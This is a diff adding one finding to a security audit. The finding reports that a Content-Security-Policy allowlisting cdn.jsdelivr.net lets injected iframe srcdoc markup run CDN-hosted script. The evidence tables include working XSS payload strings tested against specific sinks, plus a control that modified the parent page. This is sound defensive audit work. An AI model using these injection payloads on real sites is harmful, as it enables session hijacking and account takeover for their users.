@@ -256,3 +256,59 @@ scheme-less endpoint URL after `build_chat_url` (finding 4); plus caller greps f
   a three-call sequence the method hides.
 - **Fix:** delete the method, or make it fail closed for 2FA users
   (`if self.totp_enabled(username): return None`) and name it for what it does.
+
+### [SECURITY] `script-src` allowlists `cdn.jsdelivr.net`, so injected markup runs attacker-hosted script through a `srcdoc` frame
+
+- **Location:** `core/middleware.py:143`
+- **Severity:** medium
+- **Disposition:** fix-now
+- **Evidence:** the policy for every app page lets scripts load from a public CDN:
+
+  ```python
+  # core/middleware.py:141-144
+  response.headers["Content-Security-Policy"] = (
+      "default-src 'self'; "
+      f"script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
+  ```
+
+  `cdn.jsdelivr.net` serves any file from any public npm package or GitHub repository
+  (`/npm/<package>@<version>/<file>`, `/gh/<user>/<repo>@<ref>/<file>`), so the allowlist admits
+  script an attacker publishes. A `<script>` element assigned through `innerHTML` does not run, and
+  an inline handler is refused for lack of `'unsafe-inline'`. An `<iframe srcdoc>` assigned through
+  `innerHTML` does load: its document inherits the parent's policy and origin, its `<script src>` is
+  parser-inserted, and the source matches the allowlist. `frame-src 'self'` does not stop it.
+
+  Measured on 2026-10-05 in headless Chromium, on a page served with the policy string above (nonce
+  fixed for the probe), with the real CDN and three shipped sinks:
+
+  | Sink | Input | Result |
+  | --- | --- | --- |
+  | `static/js/spinner.js`, imported unmodified and driven as `chat.js:2042` and `:3153` drive it | title `<iframe srcdoc="<script src=https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js></script>">` | `cdn script ran in frame; lodash 4.17.21; frame origin http://127.0.0.1:9101` |
+  | The same spinner | title `<img src=x onerror="document.title=1">` | `no execution` |
+  | `_locHTML`, `static/js/calendar.js:3437-3449`, copied by line range | location `https://maps.example.test/room5 <iframe srcdoc="<script src=https&colon;//cdn.jsdelivr.net/…></script>">` | `cdn script ran; lodash 4.17.21`, same origin as the page |
+  | The swatch template, `static/js/theme.js:660-671`, copied by line range | theme name `<iframe/srcdoc="<script/src=https://cdn.jsdelivr.net/…></script>">`, as `src/ai_interaction.py:759` leaves it | `cdn script ran; lodash 4.17.21`, same origin as the page |
+
+  The frame's origin equals the page's, so its script reaches `parent`. A control with a stand-in
+  allowlisted origin serving `parent.document.title='PWNED'` changed the parent's title. lodash
+  stands in for an attacker's file; no attacker-controlled package was published for the probe.
+- **Impact:** the policy does not stop script execution for any sink that parses attacker text as
+  element content. The injected script runs with the user's session and `connect-src 'self'`, so it
+  can call every API the user can, which for an admin includes the shell routes. Seven findings in
+  this run describe such sinks and rated them on the assumption that the policy held:
+
+  | Sink | Section | Attacker input |
+  | --- | --- | --- |
+  | Research spinner | `static-js-chat` | A search result's title |
+  | Calendar event location | `static-js-documents-email` | A synced or imported event |
+  | Theme grid and `/theme` reply | `static-js-rest`, `static-js-chat` | A theme name from the model's `ui_control` call |
+  | Metrics popup, model picker | `static-js-chat`, `static-js-cookbook-settings-models` | A configured endpoint's model id or name |
+  | Task form textarea | `static-js-rest` | A model-authored task prompt |
+  | Research report body | `static-js-research-memory-rag` | Page text in a report; the branch is unreachable today |
+
+  This finding is medium because it needs one of those sinks. The first two are rated high in their
+  own sections; the policy is counted once, here. Attribute-only injection, as in the email chip
+  finding in `static-js-documents-email`, cannot create a frame and is not affected.
+- **Fix:** remove `https://cdn.jsdelivr.net` from `script-src`. Its one consumer is the Pyodide
+  loader (`static/js/codeRunner.js:156`): serve Pyodide from `/static/`, or load it inside a
+  sandboxed frame that carries its own policy. Fix the sinks as well; the policy is the second
+  layer, and it is the layer that failed.
